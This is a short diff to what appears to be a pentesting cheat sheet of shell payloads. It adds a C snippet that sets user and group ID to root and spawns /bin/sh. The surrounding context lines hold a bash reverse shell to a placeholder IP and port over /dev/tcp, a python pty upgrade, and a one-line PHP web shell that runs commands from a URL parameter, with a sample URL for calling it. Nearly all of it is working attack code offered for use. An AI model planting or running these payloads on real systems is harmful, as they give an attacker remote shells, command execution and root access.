@@ -40,6 +40,16 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 #!/bin/bash
 bash -i >& /dev/tcp/IP/port 0>&1
 
+#c shell
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include <sys/types.h>
+    #include <unistd.h>
+    void test_this()
+    {
+    setuid(0); setgid(0); system("/bin/sh");
+    }
+
 #for a web shell php
 <?php system($_GET["cmd"]); ?>
 # to visit it by, http://***.**/**shell.php?cmd=**
